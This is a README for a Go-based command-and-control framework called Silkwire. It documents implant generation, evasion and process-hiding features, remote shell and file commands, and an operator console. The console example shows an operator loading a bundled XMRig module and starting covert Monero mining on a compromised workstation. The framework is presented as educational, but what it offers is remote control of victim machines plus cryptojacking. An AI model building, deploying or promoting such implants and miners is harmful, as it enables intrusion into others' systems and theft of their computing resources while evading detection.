# Silkwire C2 Framework

A sophisticated gRPC-based Command and Control (C2) framework for cybersecurity research and education purposes. Features advanced implant generation, evasion techniques, and cross-platform support.

## Features

- **Secure Communication**: TLS-encrypted gRPC communication
- **Real-time Streaming**: Bidirectional streaming for immediate command execution
- **Task Management**: Queue-based task system with fallback polling
- **File Transfer**: Upload/download capabilities
- **Multi-platform**: Cross-platform support (Windows, Linux, macOS)
- **Operator Console**: Interactive command-line interface for operators
- **Session Management**: Track and manage multiple implant sessions
- **Dynamic Implant Generation**: Automated implant compilation with custom configurations
- **Evasion Techniques**: Built-in anti-detection and stealth capabilities
- **PTY Support**: Pseudo-terminal support for interactive shell sessions
- **Module System**: Extensible module framework for additional capabilities
- **XMRig Integration**: Built-in cryptocurrency mining module with remote management
- **Cryptographic Security**: Advanced encryption and secure key management
- **Database Persistence**: SQLite-based session and task persistence

## Quick Start

### Prerequisites

- Go 1.24.4 or later
- Protocol Buffer compiler (protoc)
- OpenSSL (for certificate generation)
- SQLite3 (for database functionality)

### Setup Development Environment

```bash
# Clone the repository
git clone <repository-url>
cd silkwire

# Setup development environment
make dev-setup

# This will:
# - Install Go dependencies
# - Generate protobuf files
# - Create development TLS certificates
```

### Building

```bash
# Build all components
make build

# Or build individual components
make build-server
make build-client
make build-console

# Generate cross-platform implants
make generate-implants
```

### Running

#### Method 1: Using Makefile (Recommended)

1. **Start the C2 Server:**
   ```bash
   make run-server
   ```
   This starts the server on port 8443 with TLS encryption.

2. **Connect a Client (in another terminal):**
   ```bash
   make run-client
   ```
   This connects an implant to localhost:8443.

3. **Use the Operator Console (in another terminal):**
   ```bash
   make run-console
   ```

#### Method 2: Manual Execution

1. **Generate certificates and build:**
   ```bash
   make certs
   make build
   ```

2. **Start the server:**
   ```bash
   cd certs && ../bin/c2-server
   ```

3. **Connect a client:**
   ```bash
   ./bin/c2-client localhost:8443
   ```

4. **Use the console:**
   ```bash
   ./bin/c2-console localhost:8443
   ```

#### Demo Mode

The console can run in demo mode without a server connection:
```bash
./bin/c2-console
```
This shows the interface with sample session data.

#### Console Features

The console now supports:
- **Real-time session data** - Connects to actual server and displays live implant sessions
- **Full/partial session IDs** - Use either `cd334a25` or full `cd334a2588bd0281c868894450a431fd`  
- **Live command execution** - Commands sent through console execute on real implants
- **Graceful fallback** - Works in demo mode when server is not available
- **gRPC communication** - All console operations use secure gRPC calls to server

## Usage

### Operator Console Commands

Once connected to the operator console, you can use these commands:

#### Session Management
- `sessions` - List all active sessions
- `session <id>` - Interact with a specific session
- `kill <id>` - Terminate a session

#### Command Execution (within a session)
- `shell <command>` - Execute shell command
- `ps` - List processes
- `pwd` - Show current directory
- `ls [path]` - List directory contents
- `cat <file>` - Display file contents

#### System Operations
- `sysinfo` - Get system information
- `ping <target>` - Ping a target
- `screenshot` - Take screenshot (placeholder)
- `sleep <seconds>` - Change beacon interval

#### Module Management
- `modules` or `module list` - List all available modules
- `module load <name>` - Load a module (e.g., xmrig)
- `module start <name> [key=value ...]` - Start a loaded module with parameters
  - Example: `module start xmrig pool=pool.supportxmr.com:443 wallet=YOUR_WALLET coin=monero`
  - Options: `tls=true` (enable TLS), `threads=4` (custom thread count)
- `module stop <name>` - Stop a running module
- `module status <name>` - Get detailed status of a module
- `module config <name> <json>` - Configure a module with JSON

#### Navigation
- `back` - Return to main console from session
- `help` - Show available commands
- `exit` - Exit console

### Example Session

```bash
c2> sessions
Implant ID           Hostname        Username   OS/Arch         PID        Last Seen
----------------------------------------------------------------------------------------------------
a1b2c3d4...         workstation-1   john       linux/amd64    12345      5s ago

c2> session a1b2c3d4
Interacting with session: a1b2c3d4... (john@workstation-1)
Type 'back' to return to main console

(workstation-1) > pwd
/home/john

(workstation-1) > ls
Documents  Downloads  Pictures  ...

(workstation-1) > modules
[*] Listing available modules...
[
  {
    "name": "xmrig",
    "description": "XMRig cryptocurrency miner module",
    "version": "1.0.0",
    "status": "unloaded"
  }
]

(workstation-1) > module load xmrig
[*] Loading module: xmrig
Module 'xmrig' loaded successfully

(workstation-1) > module start xmrig pool=pool.supportxmr.com:443 wallet=YOUR_WALLET_ADDRESS worker=silkwire-implant coin=monero
[*] Starting module: xmrig
Module 'xmrig' started successfully

(workstation-1) > module status xmrig
[*] Getting module status: xmrig
{
  "running": true,
  "pid": 15432,
  "started_at": "2024-01-15T10:30:00Z",
  "config": {
    "pool": "pool.supportxmr.com:443",
    "wallet": "YOUR_WALLET_ADDRESS",
    "worker": "silkwire-implant",
    "threads": 0,
    "coin": "monero",
    "tls": false
  },
  "binary_path": "/tmp/xmrig/xmrig",
  "log_file": "/tmp/xmrig/xmrig.log"
}

(workstation-1) > module stop xmrig
[*] Stopping module: xmrig
Module 'xmrig' stopped successfully

(workstation-1) > back
c2> exit
```

## Architecture

### Components

1. **Server (`server/`)**
   - gRPC server handling implant connections (`server.go`, `handlers.go`)
   - Session management and persistence (`sessions.go`, `database.go`)
   - Task queuing and distribution
   - Real-time command streaming
   - Dynamic implant generation (`implant_generator.go`)
   - Authentication and TLS management (`auth.go`, `tls.go`)

2. **Implant (`implant/`)**
   - Connects to C2 server (`main.go`, `implant.go`)
   - Command execution with evasion techniques (`commands.go`, `evasion.go`)
   - Module system for extensible capabilities (`modules.go`, `xmrig_module.go`)
   - Cross-platform support with PTY capabilities (`pty.go`, `pty_windows.go`)
   - Cryptographic operations (`crypto.go`)
   - Anti-detection features (`evasion_unix.go`, `evasion_windows.go`)

3. **Operator Console (`console/`)**
   - Interactive command-line interface (`ui.go`, `main.go`)
   - Session management and interaction (`session.go`)
   - Command execution and shell operations (`commands.go`, `shell.go`)

4. **Shared Utilities (`shared/`)**
   - Common types and structures (`types.go`)
   - Utility functions (`utils.go`)
   - Cross-component constants and helpers

5. **Generated Implants (`generated/`)**
   - Pre-compiled implants with codenames
   - Cross-platform binaries for various architectures
   - Standalone deployment packages

### Module System

The implant includes an extensible module system that allows for additional capabilities to be loaded and executed at runtime:

#### Core Components
- **Module Interface**: Standardized interface that all modules must implement
- **Module Manager**: Manages module lifecycle (load, start, stop, configure)
- **Built-in Modules**: Pre-included modules like XMRig for cryptocurrency mining

#### XMRig Module Features
- **Automatic Download**: Downloads appropriate XMRig binary for target platform
- **Configuration Management**: JSON-based configuration with pool, wallet, worker, and coin settings
- **Smart Threading**: Auto-detects optimal thread count by default (threads=0), or manual override
- **Coin Support**: Built-in support for `--coin monero` and other cryptocurrency algorithms
- **Process Management**: Start, stop, and monitor XMRig processes
- **Status Reporting**: Real-time status and performance monitoring
- **Cross-platform Support**: Works on Windows, Linux, and macOS

#### Module Commands
- `MODULE_LOAD`: Initialize and prepare a module for execution
- `MODULE_START`: Begin module execution with specified parameters
- `MODULE_STOP`: Halt module execution gracefully
- `MODULE_STATUS`: Retrieve detailed module status and performance data
- `MODULE_CONFIG`: Update module configuration with JSON data
- `MODULE_LIST`: List all available modules and their current status

### Communication Flow

1. Implant registers with server and receives session token
2. Implant establishes bidirectional stream for real-time communication
3. Operator issues commands through console
4. Server forwards commands to appropriate implant
5. Implant executes commands and returns results
6. Results are displayed in operator console

### Security Features

- **TLS Encryption**: All communication is encrypted using TLS
- **Session Tokens**: Secure session management with random tokens
- **Authentication**: Metadata-based authentication for all requests
- **Jittered Beacons**: Randomized beacon intervals to avoid detection
- **Evasion Capabilities**: Built-in anti-detection and stealth features
- **Cryptographic Operations**: Secure key management and data protection
- **Database Encryption**: Encrypted persistence of session data
- **Process Hiding**: Platform-specific process concealment techniques

## Development

### Adding New Commands

1. Add command type to `proto/c2.proto` in the `CommandType` enum
2. Implement command handler in `implant/commands.go`
3. Add console command in `console/commands.go`
4. Regenerate protobuf files: `make proto`
5. Rebuild: `make build`

### Generating Custom Implants

```bash
# Generate cross-platform implants with custom server address
make generate-implants

# Clean generated implants
make clean-generated
```

### Database Management

The server uses SQLite for persistence. Database file is located at `c2_server.db` in the certs directory.

### Testing

```bash
# Run tests
make test

# Clean and rebuild
make clean
make build
```

## Security Considerations

- This framework is for authorized testing only
- Always use proper TLS certificates in production
- Implement proper access controls and logging
- Follow responsible disclosure practices
- Ensure compliance with applicable laws and regulations

## License

This project is provided for educational purposes only. Use responsibly and legally.

## Contributing

Contributions for educational improvements are welcome. Please ensure all contributions maintain the educational focus and include appropriate security considerations.